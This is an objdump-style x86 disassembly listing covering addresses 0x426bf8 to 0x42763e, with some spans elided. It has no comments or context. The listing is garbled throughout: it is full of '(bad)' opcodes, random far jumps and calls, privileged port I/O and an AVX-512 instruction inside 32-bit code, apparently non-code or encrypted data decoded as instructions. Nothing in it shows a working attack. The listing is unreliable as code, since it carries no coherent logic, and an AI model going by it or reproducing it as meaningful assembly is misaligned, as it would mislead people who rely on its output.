  426bf8:	sbb    ebx,DWORD PTR [ecx+0x7d9e7174]
  426bfe:	aas    
  426bff:	mov    bl,0xe6
  426c01:	push   0x77
  426c03:	mov    eax,0xefe5ebc2
  426c08:	sub    ch,ch
  426c0a:	cmp    al,0xdc
  426c0c:	fisubr WORD PTR [esi-0x21]
  426c0f:	dec    esp
	...
  426c74:	loop   0x426cd6
  426c76:	test   DWORD PTR [esi+0x74f3f787],esi
  426c7c:	mov    ah,0xeb
  426c7e:	cld    
  426c7f:	mov    edx,0xc689332c
  426c84:	add    BYTE PTR [esi+0x1040001],bl
  426c8a:	add    BYTE PTR [eax],al
  426c8c:	adc    eax,0x67b091ad
  426c91:	jb     0x426c7e
  426c93:	sub    esp,DWORD PTR [ecx-0x1810f3d0]
  426c99:	fdiv   QWORD PTR [edx]
  426c9b:	add    eax,0xbbe0c506
  426ca0:	leave  
  426ca1:	pop    esp
  426ca2:	jle    0x426c63
  426ca4:	ss loop 0x426c96
  426ca7:	mov    edi,0x5e00f9
  426cac:	loopne 0x426ca8
  426cae:	(bad)  
  426caf:	call   0x7a72:0xb70ad390
  426cb6:	cdq    
  426cb7:	clc    
  426cb8:	mov    esi,0x71ee1957
  426cbd:	imul   ecx,DWORD PTR [edi+0x47],0xaac8a62
  426cc4:	jnp    0x426caa
  426cc6:	add    eax,0x67ceec49
  426ccb:	xchg   ebx,eax
  426ccc:	pop    ss
  426ccd:	nop
  426cce:	mov    esp,0x2363316a
  426cd3:	mov    bl,0x5b
  426cd5:	inc    DWORD PTR [ecx+ebp*1+0xb3fc619]
  426cdc:	sbb    ebx,DWORD PTR [ebx]
  426cde:	dec    eax
  426cdf:	push   es
  426ce0:	outs   dx,BYTE PTR ds:[esi]
  426ce1:	pop    ds
  426ce2:	std    
  426ce3:	adc    eax,0x3c4ee7a4
  426ce8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426ce9:	je     0x426d5c
  426ceb:	jp     0x426d51
  426ced:	(bad)  
  426cee:	repnz mov BYTE PTR [esi],dl
  426cf1:	mov    ds:0xa66121d2,al
  426cf6:	mov    dl,0x9d
  426cf8:	pop    ebp
  426cf9:	dec    edx
  426cfa:	jmp    0x426d3e
  426cfc:	xchg   ebx,eax
  426cfd:	jp     0x426c94
  426cff:	sbb    edi,0x7d
  426d02:	xor    DWORD PTR cs:[ebx+0x3d113f50],esp
  426d09:	or     edi,DWORD PTR [edx+0x669b445d]
  426d0f:	xor    BYTE PTR [edi-0x1c8f5b99],dh
  426d15:	cdq    
  426d16:	push   edi
  426d17:	ins    BYTE PTR es:[edi],dx
  426d18:	xchg   ecx,eax
  426d19:	mov    dl,0x2
  426d1b:	ins    DWORD PTR es:[edi],dx
  426d1c:	sahf   
  426d1d:	stos   DWORD PTR es:[edi],eax
  426d1e:	test   al,0x45
  426d20:	fistp  WORD PTR [ecx+edi*4]
  426d23:	lock cmp bh,BYTE PTR [ebx]
  426d26:	test   BYTE PTR [ebx],al
  426d28:	std    
  426d29:	cmp    DWORD PTR [edx+esi*8],esi
  426d2c:	iret   
  426d2d:	and    BYTE PTR [esi+0xa],al
  426d30:	or     edx,DWORD PTR [esi+0x4]
  426d33:	sbb    cl,BYTE PTR [ebx+eiz*4-0x4e]
  426d37:	dec    ebx
  426d38:	sar    DWORD PTR [edi+ebx*4-0x183edf19],0xeb
  426d40:	pop    ebp
  426d41:	jge    0x426d5f
  426d43:	xchg   esi,eax
  426d44:	(bad)  
  426d45:	xchg   edi,eax
  426d46:	push   edx
  426d47:	nop
  426d48:	jl     0x426d3d
  426d4a:	pop    ss
  426d4b:	imul   esi,edx,0x53
  426d4e:	(bad)  
  426d4f:	push   0xffffffa2
  426d51:	inc    DWORD PTR [edx+edi*2]
  426d54:	push   ebp
  426d55:	out    0x8,al
  426d57:	push   edi
  426d58:	mov    ah,0x67
  426d5a:	stos   BYTE PTR es:[edi],al
  426d5b:	add    DWORD PTR [ebx+0x3d812283],edx
  426d61:	mov    eax,0x125528c0
  426d66:	ins    BYTE PTR es:[edi],dx
  426d67:	(bad)  
  426d68:	cmp    al,dl
  426d6a:	hlt    
  426d6b:	cmc    
  426d6c:	pop    ds
  426d6d:	repnz push ebp
  426d6f:	inc    ecx
  426d70:	shl    cl,1
  426d72:	inc    esp
  426d73:	test   al,0x38
  426d75:	dec    eax
  426d76:	dec    ecx
  426d77:	ret    
  426d78:	lahf   
  426d79:	cli    
  426d7a:	pop    edi
  426d7b:	push   esp
  426d7c:	fild   WORD PTR [ebp+0x1a]
  426d7f:	sub    cl,dh
  426d81:	dec    edx
  426d82:	xchg   edx,eax
  426d83:	push   0xffffffd5
  426d85:	sbb    eax,0x344e0ac8
  426d8a:	pop    edx
  426d8b:	fdiv   QWORD PTR [ebp-0x60]
  426d8e:	sub    BYTE PTR [eax+eax*1+0x0],dl
	...
  426df1:	add    BYTE PTR [eax],al
  426df3:	add    BYTE PTR [edx],cl
  426df5:	mov    cl,0x61
  426df7:	repz sti 
  426df9:	repz call 0xd50c:0xc7c2ecf9
  426e01:	xchg   BYTE PTR [ecx+0x19f0470],ah
  426e07:	add    BYTE PTR [ecx+eax*1],al
  426e0a:	add    BYTE PTR [eax],al
  426e0c:	and    dh,BYTE PTR [edi]
  426e0e:	add    eax,0x85ba698d
  426e13:	shr    BYTE PTR fs:[ecx+0x45c759f9],cl
  426e1a:	add    BYTE PTR [edx-0x5b4149c1],ah
  426e20:	loop   0x426e11
  426e22:	jp     0x426e88
  426e24:	or     al,0x1a
  426e26:	xor    DWORD PTR [ecx+0x5af3e9af],ecx
  426e2c:	imul   ebx,DWORD PTR cs:[ebp+0x2e467a62],0xe
  426e34:	jmp    0xb59e618c
  426e39:	xchg   edi,eax
  426e3a:	rcr    DWORD PTR [edx],cl
  426e3c:	xor    BYTE PTR [edi+0x7e6e0542],dh
  426e42:	pop    ecx
  426e43:	pop    esi
  426e44:	cld    
  426e45:	out    0x1a,eax
  426e47:	addr16 mov ch,0xd
  426e4a:	sbb    ah,dh
  426e4c:	aaa    
  426e4d:	mov    WORD PTR [edi-0x4ee748a8],cs
  426e53:	popf   
  426e54:	jae    0x426e59
  426e56:	mov    ebx,0x9df0ddda
  426e5b:	jmp    0x8c703698
  426e60:	sahf   
  426e61:	es cwde 
  426e63:	xchg   DWORD PTR [eax],ebx
  426e65:	jnp    0x426e22
  426e67:	cmp    BYTE PTR [eax+0x23],bh
  426e6a:	jge    0x426e69
  426e6c:	mov    bh,0x19
  426e6e:	in     al,dx
  426e6f:	fadd   QWORD PTR [ebx-0x4546fd63]
  426e75:	push   ecx
  426e76:	jecxz  0x426e14
  426e78:	and    ecx,DWORD PTR [eax]
  426e7a:	inc    esp
  426e7b:	mov    esi,0x226210f3
  426e80:	cmp    al,BYTE PTR [ebx+0x75f52e7f]
  426e86:	in     al,dx
  426e87:	sub    edx,DWORD PTR [edi+esi*1-0x197d3fab]
  426e8e:	xchg   ecx,eax
  426e8f:	push   ebp
  426e90:	shl    BYTE PTR ds:0x3b57b0a6,0x7
  426e97:	mov    cl,0x41
  426e99:	(bad)  
  426e9a:	sbb    BYTE PTR [edi+0x3703ab9f],ch
  426ea0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426ea1:	xor    ah,BYTE PTR [eax+eiz*8-0x5a0d75db]
  426ea8:	addr16 dec esp
  426eaa:	jmp    0x6629:0x7ecdd90d
  426eb1:	inc    DWORD PTR [ebp+0xa086694]
  426eb7:	jmp    0x426f20
  426eb9:	shl    BYTE PTR [esi-0x5],1
  426ebc:	repnz out 0x53,eax
  426ebf:	mov    dh,0x3a
  426ec1:	inc    edi
  426ec2:	mov    dh,0xd2
  426ec5:	lock sbb BYTE PTR [edx],ah
  426ec8:	mov    eax,0xc5495b54
  426ecd:	gs or  esp,ecx
  426ed0:	(bad)  
  426ed1:	aaa    
  426ed2:	fmul   QWORD PTR [ecx+0x51706b6d]
  426ed8:	(bad)  
  426ed9:	sbb    BYTE PTR [esi],0x1a
  426edc:	mov    ds:0x98d1fab,eax
  426ee1:	jbe    0x426f1f
  426ee3:	outs   dx,BYTE PTR ds:[esi]
  426ee4:	add    BYTE PTR [ebx],ch
  426ee6:	(bad)  [edx+0x4a]
  426ee9:	cmp    DWORD PTR [ebx+0x22],eax
  426eec:	or     al,dl
  426eee:	scas   eax,DWORD PTR es:[edi]
  426eef:	ins    BYTE PTR es:[edi],dx
  426ef0:	mov    ds:0xdbc52f8f,eax
  426ef5:	bswap  edi
  426ef7:	cmp    BYTE PTR [edi+ecx*2-0x4e],bl
  426efb:	dec    eax
  426efc:	fs push eax
  426efe:	jp     0x426eda
  426f00:	jne    0x426f77
  426f02:	js     0x426f05
  426f04:	(bad)  
  426f05:	popf   
  426f06:	mov    al,0x49
  426f08:	xlat   BYTE PTR ds:[ebx]
  426f09:	jns    0x426eff
  426f0b:	jo     0x426f12
  426f0d:	dec    ebp
  426f0e:	lods   al,BYTE PTR ds:[esi]
  426f0f:	jmp    0x426f14
	...
  426f74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426f75:	mov    ds:0xf5c7f1c7,al
  426f7a:	mov    dh,0xf7
  426f7c:	inc    edi
  426f7d:	inc    ecx
  426f7e:	add    DWORD PTR [edi+ebx*1+0x88b2a74],esp
  426f85:	mov    al,ds:0x1040001
  426f8a:	add    BYTE PTR [eax],al
  426f8c:	sbb    edi,esi
  426f8e:	int    0xb9
  426f90:	inc    esp
  426f91:	jo     0x427006
  426f93:	sub    BYTE PTR [edx-0x3ea93a6],0x91
  426f9a:	cmp    eax,0x2876b963
  426f9f:	jge    0x426fb6
  426fa1:	test   eax,0xf7502cc7
  426fa6:	sub    edi,ecx
  426fa8:	ins    BYTE PTR es:[edi],dx
  426fa9:	adc    bl,bl
  426fab:	shl    DWORD PTR [ecx],0xba
  426fae:	fwait
  426faf:	jle    0x426fd2
  426fb1:	jmp    0x1e5736
  426fb6:	(bad)  
  426fb7:	loope  0x42700b
  426fb9:	or     DWORD PTR [ebx],esi
  426fbb:	(bad)  
  426fbd:	cs in  al,0x51
  426fc0:	daa    
  426fc1:	pop    ebp
  426fc2:	jb     0x42702e
  426fc4:	arpl   WORD PTR [edx],bx
  426fc6:	outs   dx,BYTE PTR ds:[esi]
  426fc7:	es push cs
  426fc9:	gs ins DWORD PTR es:[edi],dx
  426fcb:	fld    TBYTE PTR [ecx+0x4]
  426fce:	scas   eax,DWORD PTR es:[edi]
  426fcf:	or     al,ch
  426fd1:	bound  edi,QWORD PTR [ebp-0x25]
  426fd4:	test   BYTE PTR [eax+0x4e64efe8],dh
  426fda:	jge    0x427029
  426fdc:	pop    edx
  426fdd:	leave  
  426fde:	not    DWORD PTR [ecx-0x3d]
  426fe1:	out    0x8d,al
  426fe3:	and    DWORD PTR [edx-0x1],esi
  426fe6:	hlt    
  426fe7:	xchg   dx,ax
  426fe9:	lea    edi,[edx+0x30ce6140]
  426fef:	or     ecx,esp
  426ff1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426ff2:	(bad)  
  426ff3:	xchg   esp,eax
  426ff4:	push   ss
  426ff5:	pop    es
  426ff6:	mov    edx,DWORD PTR [eax]
  426ff8:	in     al,dx
  426ff9:	and    ecx,DWORD PTR [ebx+0x77]
  426ffc:	outs   dx,DWORD PTR ds:[esi]
  426ffd:	or     dl,BYTE PTR [ecx]
  426fff:	jl     0x427042
  427001:	jg     0x426f98
  427003:	push   ds
  427004:	fcom   QWORD PTR [edi+edx*4]
  427007:	icebp  
  427008:	xor    BYTE PTR [esi],ah
  42700a:	push   eax
  42700b:	inc    eax
  42700c:	push   edi
  42700d:	out    0x6b,eax
  42700f:	(bad)  
  427011:	call   0x9ed3480f
  427016:	fistp  WORD PTR fs:[edx]
  427019:	pop    edx
  42701a:	push   edi
  42701b:	lods   al,BYTE PTR ds:[esi]
  42701c:	out    dx,eax
  42701d:	pop    ebp
  42701e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42701f:	mov    ss,WORD PTR [eax-0x31]
  427022:	push   ecx
  427023:	inc    esp
  427024:	sbb    DWORD PTR [ebx-0x6dd353f4],eax
  42702a:	or     ecx,DWORD PTR [ebp-0x6d]
  42702d:	lods   eax,DWORD PTR ds:[esi]
  42702e:	cmp    dl,BYTE PTR [ecx]
  427030:	cli    
  427031:	sar    WORD PTR [ebp+edx*2-0x412228af],cl
  427039:	aas    
  42703a:	pop    edx
  42703b:	enter  0xbed0,0x88
  42703f:	add    dl,bl
  427041:	xor    eax,DWORD PTR [eax]
  427043:	mov    bh,0x3a
  427045:	in     al,dx
  427046:	dec    ebp
  427047:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427048:	stos   DWORD PTR es:[edi],eax
  427049:	push   0x8899aaa1
  42704e:	outs   dx,BYTE PTR ds:[esi]
  42704f:	mov    eax,gs:0x410e256d
  427055:	sbb    ecx,ebp
  427057:	push   es
  427058:	pushf  
  427059:	mov    cl,0x34
  42705b:	or     eax,0x7effe4cf
  427060:	nop
  427061:	sbb    eax,0xcbbf9c3a
  427066:	jnp    0x427046
  427068:	leave  
  427069:	or     DWORD PTR [esi-0x2e2e7715],0xffffff87
  427070:	mov    ds:0xc2f19be2,eax
  427075:	in     al,dx
  427076:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427078:	adc    al,0x57
  42707a:	aad    0xc2
  42707c:	or     al,0x3a
  42707e:	dec    edx
  42707f:	retf   0xd10a
  427082:	jo     0x4270d1
  427084:	lods   al,BYTE PTR ds:[esi]
  427085:	or     al,0x5f
  427087:	shl    BYTE PTR [ebp-0x330847a0],1
  42708d:	xchg   esp,eax
  42708e:	push   ss
  42708f:	xor    eax,DWORD PTR [eax]
	...
  4270f1:	add    BYTE PTR [eax],al
  4270f3:	add    BYTE PTR [ebp*2-0x8846ae6],cl
  4270fa:	(bad)  
  4270fb:	std    
  4270fc:	inc    esp
  4270fd:	mov    ebp,0xc15f9d96
  427102:	pop    ss
  427103:	dec    BYTE PTR [ecx+eiz*4]
  427106:	add    DWORD PTR [eax],eax
  427108:	add    al,0x1
  42710a:	add    BYTE PTR [eax],al
  42710c:	sub    DWORD PTR [edi],edx
  42710e:	into   
  42710f:	test   BYTE PTR [eax+ebp*1],bh
  427112:	mov    ecx,0xe168bad2
  427117:	adc    DWORD PTR [edx+0x1b],esp
  42711a:	xchg   edx,esp
  42711c:	cli    
  42711d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42711e:	stc    
  42711f:	loop   0x42715a
  427121:	add    eax,DWORD PTR [eax+0x22]
  427124:	mov    DWORD PTR [edi-0x9],esp
  427127:	dec    esp
  427128:	xchg   DWORD PTR [edi+0x35],esi
  42712b:	mov    ah,0x90
  42712d:	add    DWORD PTR [edx],esi
  42712f:	out    dx,eax
  427130:	loope  0x427160
  427132:	sbb    bh,BYTE PTR [edi-0x7d]
  427135:	push   0x62
  427137:	daa    
  427138:	(bad)  
  42713a:	test   eax,0x5d0d540b
  42713f:	stos   BYTE PTR es:[edi],al
  427140:	fadd   QWORD PTR [edx-0x6f7cd47d]
  427146:	repnz and ebx,DWORD PTR [ebx-0x70a18001]
  42714d:	push   ebp
  42714e:	inc    esi
  42714f:	jge    0x427108
  427151:	jae    0x4270d5
  427153:	fsub   QWORD PTR [ebp+0x30b9ee3a]
  427159:	mov    bl,0x5
  42715b:	xchg   ecx,eax
  42715c:	in     al,dx
  42715d:	add    DWORD PTR [esi],0xe084c86c
  427163:	ja     0x427115
  427165:	rcl    DWORD PTR [edi-0x64a2c73d],cl
  42716b:	add    cl,dh
  42716d:	inc    ecx
  42716e:	push   cs
  42716f:	push   ss
  427170:	(bad)  
  427171:	sub    esi,ebx
  427173:	xchg   ecx,eax
  427174:	jae    0x4271bf
  427176:	stos   BYTE PTR es:[edi],al
  427177:	fsubr  QWORD PTR [esi+0x1c]
  42717a:	lock daa 
  42717c:	mov    ecx,0x24ae51d5
  427181:	dec    ebx
  427182:	shr    BYTE PTR [ebp-0x30],cl
  427185:	mov    al,0x39
  427187:	in     eax,0xe9
  427189:	(bad)  
  42718b:	loopne 0x4271cf
  42718d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42718e:	inc    ebx
  42718f:	popf   
  427190:	dec    ecx
  427191:	aam    0x39
  427193:	arpl   WORD PTR [ebp-0x124577a],sp
  427199:	xchg   esp,esi
  42719b:	jnp    0x4271ed
  42719d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42719e:	xor    ebx,DWORD PTR [edx]
  4271a0:	push   ebp
  4271a1:	inc    ecx
  4271a2:	xchg   ecx,eax
  4271a3:	pusha  
  4271a4:	arpl   WORD PTR [edi-0xf],bp
  4271a7:	retf   
  4271a8:	mov    edx,0x8e7b244f
  4271ad:	pop    es
  4271ae:	sub    bh,bl
  4271b0:	mov    ah,BYTE PTR [ebp+0x2972b8ba]
  4271b6:	jg     0x427179
  4271b8:	stc    
  4271b9:	sbb    BYTE PTR [edx+0x55ff4e67],al
  4271bf:	mov    esi,DWORD PTR [esi+0x43]
  4271c2:	and    eax,0x2c675815
  4271c7:	jno    0x427219
  4271c9:	xchg   esp,eax
  4271ca:	mov    ecx,0xa10c5d63
  4271cf:	loope  0x42715e
  4271d1:	push   ebx
  4271d2:	gs xor al,0x82
  4271d5:	mov    WORD PTR [edi-0x36],ss
  4271d8:	pop    ds
  4271d9:	mov    edx,0x5a290606
  4271de:	push   0xd6eda1bb
  4271e3:	pop    eax
  4271e4:	fistp  QWORD PTR [eax-0x7b8d5127]
  4271ea:	stos   BYTE PTR es:[edi],al
  4271eb:	jecxz  0x427188
  4271ed:	stc    
  4271ee:	pop    esi
  4271ef:	pusha  
  4271f0:	xor    al,0x45
  4271f2:	jnp    0x4271b9
  4271f4:	mov    al,ds:0xe26276f2
  4271f9:	imul   ebx,DWORD PTR gs:[ecx+esi*8-0xf],0xffffffde
  4271ff:	data16 sub ah,BYTE PTR [edi]
  427202:	lahf   
  427203:	(bad)  
  427204:	cld    
  427205:	fsubr  DWORD PTR [edx+ebp*4-0x46]
  427209:	(bad)  
  42720a:	xor    bl,BYTE PTR [ebp-0x52]
  42720d:	jmp    0x42ae5f
	...
  427272:	add    BYTE PTR [eax],al
  427274:	push   ds
  427275:	inc    ecx
  427276:	fdiv   QWORD PTR [edi+ebx*8-0x7e148143]
  42727d:	push   ecx
  42727e:	dec    ebp
  42727f:	mov    ds:0xcdb9a0f6,al
  427284:	adc    BYTE PTR [edx+0x1040001],ah
  42728a:	add    BYTE PTR [eax],al
  42728c:	cli    
  42728d:	sti    
  42728e:	xor    edx,DWORD PTR [edi-0x7076e3ba]
  427294:	jg     0x4272fc
  427296:	or     bl,ch
  427298:	fsubr  st(0),st
  42729a:	xor    DWORD PTR [eax+0x903397d],esi
  4272a0:	jne    0x427254
  4272a2:	ins    DWORD PTR es:[edi],dx
  4272a3:	and    BYTE PTR [ecx+0x5d3ca9b0],bl
  4272a9:	rcr    esp,1
  4272ab:	or     DWORD PTR [esi-0x3318d3b3],ebx
  4272b1:	inc    ecx
  4272b2:	jmp    0x1f263352
  4272b7:	cli    
  4272b8:	xor    edi,DWORD PTR [ecx-0x5394a620]
  4272be:	add    ebx,eax
  4272c0:	aad    0xc4
  4272c2:	scas   eax,DWORD PTR es:[edi]
  4272c3:	lods   eax,DWORD PTR ds:[esi]
  4272c4:	aam    0x83
  4272c6:	(bad)  
  4272c7:	lahf   
  4272c8:	cmp    esi,DWORD PTR [esp+edi*2]
  4272cb:	mov    bh,0x78
  4272cd:	scas   al,BYTE PTR es:[edi]
  4272ce:	das    
  4272cf:	xor    DWORD PTR [edi-0x1a],0x941a8dec
  4272d6:	mov    edi,0xce16fc95
  4272db:	enter  0x4040,0xaf
  4272df:	js     0x427322
  4272e1:	stos   BYTE PTR es:[edi],al
  4272e2:	jg     0x42735a
  4272e4:	stc    
  4272e5:	push   0xe7bbdf01
  4272ea:	sub    esp,DWORD PTR [esi+0x6f4c4c0b]
  4272f0:	and    eax,0x607830c9
  4272f5:	loopne 0x427301
  4272f7:	xor    esp,edi
  4272f9:	mov    ah,0xcf
  4272fb:	test   BYTE PTR [esi+eiz*4+0x4e22baed],dl
  427302:	cli    
  427303:	rcr    BYTE PTR [esi-0x27],cl
  427306:	es ins WORD PTR es:[edi],dx
  427309:	add    eax,0xecee9eb8
  42730e:	aas    
  42730f:	retf   
  427310:	stc    
  427311:	in     eax,dx
  427312:	push   edi
  427313:	fsubr  DWORD PTR [esi+0x1eab1532]
  427319:	dec    edx
  42731a:	and    eax,0xd64dde73
  42731f:	cwde   
  427320:	mov    ebx,0xdff2f975
  427325:	or     al,0x96
  427327:	jge    0x4272d1
  427329:	sub    al,0xb9
  42732b:	xchg   ecx,eax
  42732c:	std    
  42732d:	fcom   DWORD PTR ds:0x76d0d454
  427333:	mov    ebx,0xb0a5eb31
  427338:	ret    0x1d91
  42733b:	jecxz  0x427365
  42733d:	sbb    DWORD PTR [esi],edx
  42733f:	shl    BYTE PTR [edi-0x12],cl
  427342:	push   ebp
  427343:	test   eax,0xa215f65f
  427348:	dec    esi
  427349:	push   edi
  42734a:	addr16 xor ah,dl
  42734d:	pop    edx
  42734e:	outs   dx,DWORD PTR ds:[esi]
  42734f:	jecxz  0x4273c4
  427351:	sub    esp,DWORD PTR [edi]
  427353:	mov    ds:0x9cf1af74,eax
  427358:	sbb    ch,0xc6
  42735b:	mov    bh,0xd8
  42735d:	lods   al,BYTE PTR ds:[esi]
  42735e:	leave  
  42735f:	xchg   BYTE PTR [esi],ah
  427361:	mov    ecx,DWORD PTR [edi+0x1b]
  427364:	hlt    
  427365:	js     0x427382
  427367:	fwait
  427368:	adc    ch,BYTE PTR [ebx+0x4b0405d7]
  42736e:	pop    eax
  42736f:	shl    DWORD PTR [edi+edi*8],cl
  427372:	iret   
  427373:	sub    eax,0x227eb24a
  427378:	and    edi,DWORD PTR [ebp+edx*8+0x5a22b6e2]
  42737f:	mov    edx,0x77402e2
  427384:	mov    al,0xf6
  427386:	cld    
  427387:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427388:	test   DWORD PTR [esi],0xb93e4287
  42738e:	cmp    DWORD PTR [ecx+0x0],edx
	...
  4273f4:	adc    bl,BYTE PTR ds:0xaf3f8832
  4273fa:	mov    edx,0x29f0389f
  4273ff:	sbb    ebp,esi
  427401:	nop
  427402:	inc    esi
  427403:	jp     0x427419
  427405:	mov    ds:0x1040001,eax
  42740a:	add    BYTE PTR [eax],al
  42740c:	loop   0x4273d7
  42740e:	mov    ds:0xf59974e1,al
  427413:	inc    edi
  427415:	xchg   ebx,eax
  427416:	inc    esp
  427417:	push   ebx
  427418:	imul   ah
  42741a:	jg     0x4273bf
  42741c:	dec    eax
  42741d:	pop    esp
  42741e:	and    dl,BYTE PTR [ebp-0x2f]
  427421:	and    al,0x9d
  427423:	shl    DWORD PTR [ebx-0x48abe5d],0x2
  42742a:	fs jmp 0x42740d
  42742d:	push   ebp
  42742e:	test   BYTE PTR ds:0x6ae34c01,0x18
  427435:	lods   eax,DWORD PTR ds:[esi]
  427436:	sub    eax,0x9c6afc76
  42743b:	cmp    ecx,DWORD PTR [esi-0xa]
  42743e:	sub    ebx,DWORD PTR [ecx+eax*2]
  427441:	inc    esp
  427442:	daa    
  427443:	push   esi
  427444:	in     eax,dx
  427445:	(bad)  
  427446:	xchg   ebp,eax
  427447:	xchg   esp,eax
  427448:	popa   
  427449:	sbb    al,dh
  42744b:	jp     0x427492
  42744d:	mov    dl,0xd7
  42744f:	xchg   DWORD PTR [ebx+0x3c],esi
  427452:	mov    ds:0x87e3f1a2,al
  427457:	mov    ds:0x867bd411,al
  42745c:	or     eax,0x185fae45
  427461:	(bad)  
  427462:	repnz stc 
  427464:	mov    bl,0xfc
  427466:	add    esi,eax
  427468:	jecxz  0x4274ae
  42746a:	or     al,0x24
  42746c:	mov    dl,0xfc
  42746e:	outs   dx,DWORD PTR ds:[esi]
  42746f:	aam    0x2f
  427471:	adc    DWORD PTR [esi],0xffffff82
  427474:	push   esp
  427475:	push   eax
  427476:	repz pop ds
  427478:	mov    ecx,0xde4675ca
  42747d:	or     al,0x1a
  42747f:	loop   0x4274a5
  427481:	in     al,0xca
  427483:	loope  0x4274e3
  427485:	add    eax,0x9fe0de9f
  42748a:	into   
  42748b:	sbb    al,0xc1
  42748d:	(bad)  
  42748e:	inc    ecx
  42748f:	icebp  
  427490:	les    ebx,FWORD PTR [ebx]
  427492:	ja     0x427495
  427494:	outs   dx,DWORD PTR ds:[esi]
  427495:	xor    DWORD PTR [ebx],ebx
  427497:	mov    al,ds:0x229f92b5
  42749c:	rep ins BYTE PTR es:[edi],dx
  42749e:	imul   edx,DWORD PTR [eax+0x0],0x8b496c69
  4274a5:	and    dh,BYTE PTR es:[edi]
  4274a8:	call   0x5dcc:0x1c9f38f9
  4274af:	adc    DWORD PTR [ebp+0x2e400555],eax
  4274b5:	les    edx,FWORD PTR [ecx-0x6b5c6d56]
  4274bb:	mov    al,ds:0xd59b968d
  4274c0:	pop    ss
  4274c1:	fdiv   QWORD PTR [eax]
  4274c3:	inc    ebp
  4274c4:	mov    al,0xe3
  4274c6:	dec    esp
  4274c7:	push   esi
  4274c8:	fdivr  QWORD PTR [ebp-0x19843c9e]
  4274ce:	xor    DWORD PTR cs:[ecx-0x62],esp
  4274d2:	shl    DWORD PTR [esp+edi*4-0x3e],cl
  4274d6:	into   
  4274d7:	iret   
  4274d8:	addr16 (bad) 
  4274da:	fist   WORD PTR [eax]
  4274dc:	loopne 0x42748c
  4274de:	add    ecx,0xfffffff3
  4274e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4274e2:	mov    ax,0xc9eb
  4274e6:	mov    al,0xc0
  4274e8:	jge    0x4274d4
  4274ea:	and    dl,ah
  4274ec:	(bad)  
  4274ed:	push   eax
  4274ee:	xor    ecx,DWORD PTR [edi]
  4274f0:	into   
  4274f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4274f2:	and    edi,ecx
  4274f4:	push   edx
  4274f5:	pop    ds
  4274f6:	mov    al,ds:0x242e49e6
  4274fb:	(bad)  
  4274fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4274fd:	add    al,0x7d
  4274ff:	scas   al,BYTE PTR es:[edi]
  427500:	dec    edx
  427501:	in     eax,dx
  427502:	push   eax
  427503:	mulps  xmm7,XMMWORD PTR [eax+0x12]
  427507:	adc    bh,ah
  427509:	out    dx,eax
  42750a:	clc    
  42750b:	mov    bl,0xb
  42750d:	mov    ah,0xe8
  42750f:	push   cs
	...
  427574:	pop    esp
  427575:	test   al,0xc0
  427577:	stos   DWORD PTR es:[edi],eax
  427578:	hlt    
  427579:	jmp    0x4275fa
  42757b:	(bad)  
  42757c:	cmp    dh,BYTE PTR [esi]
  42757e:	jbe    0x4275ea
  427580:	mov    BYTE PTR [edx-0x5be7e360],dh
  427586:	add    DWORD PTR [eax],eax
  427588:	add    al,0x1
  42758a:	add    BYTE PTR [eax],al
  42758c:	xchg   ecx,eax
  42758d:	imul   esp,DWORD PTR [edx+0x65],0xc988ab40
  427594:	pusha  
  427595:	mov    DWORD PTR [eax-0x3d989daf],ebp
  42759b:	into   
  42759c:	aam    0x27
  42759e:	mov    ebx,0x818b47d2
  4275a3:	jns    0x427622
  4275a5:	pop    edi
  4275a6:	daa    
  4275a7:	push   es
  4275a8:	xor    eax,0xfcecf7b7
  4275ad:	pop    ebp
  4275ae:	dec    eax
  4275af:	scas   eax,DWORD PTR es:[edi]
  4275b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4275b1:	jecxz  0x42757a
  4275b3:	fs mov esp,0xcc4afdd0
  4275b9:	and    al,BYTE PTR [eax]
  4275bb:	daa    
  4275bc:	scas   eax,DWORD PTR es:[edi]
  4275bd:	test   al,0x85
  4275bf:	sar    DWORD PTR [esi-0x4f913d51],0x83
  4275c6:	out    0xae,al
  4275c8:	addr16 retf 0xedc2
  4275cc:	out    dx,al
  4275cd:	sbb    al,BYTE PTR [ebx+edx*4-0x7d08ef8f]
  4275d4:	fldenv [edi+0x409ff66c]
  4275da:	mov    eax,ds:0x38e7cbbb
  4275df:	vpsrlvq zmm4{k1}{z},zmm2,QWORD PTR [edx+0x392c2ec0]{1to8}
  4275e9:	jg     0x4275aa
  4275eb:	dec    edx
  4275ec:	loope  0x4275ea
  4275ee:	dec    BYTE PTR [edi+edi*1]
  4275f1:	rep ins BYTE PTR es:[edi],dx
  4275f3:	fs into 
  4275f5:	xchg   ebp,eax
  4275f6:	xchg   esi,eax
  4275f7:	xchg   ebp,eax
  4275f8:	mov    dh,0xbb
  4275fa:	mov    DWORD PTR [esi-0x77],esi
  4275fd:	mov    bl,0x20
  4275ff:	pop    esi
  427600:	je     0x4275bf
  427602:	aas    
  427603:	inc    edi
  427604:	nop
  427605:	mov    DWORD PTR [ebx-0x5],eax
  427608:	into   
  427609:	stos   BYTE PTR es:[edi],al
  42760a:	pop    ss
  42760b:	(bad)  
  42760c:	mov    al,0xb3
  42760e:	in     al,0x26
  427610:	imul   ecx,DWORD PTR ds:0x536c9762,0x5
  427617:	test   BYTE PTR [edi],0xae
  42761a:	mov    al,0x55
  42761c:	xor    eax,0x7bf4df94
  427621:	xor    ch,BYTE PTR [ecx+esi*4+0x21fc1e21]
  427628:	jmp    0x90a9:0x25dd841b
  42762f:	enter  0x5102,0xd7
  427633:	test   DWORD PTR ds:0xd6a83fd5,esi
  427639:	neg    DWORD PTR [edx+0x44]
  42763c:	mov    al,0x61
  42763e:	outs   dx,DWORD PTR ds:[esi]
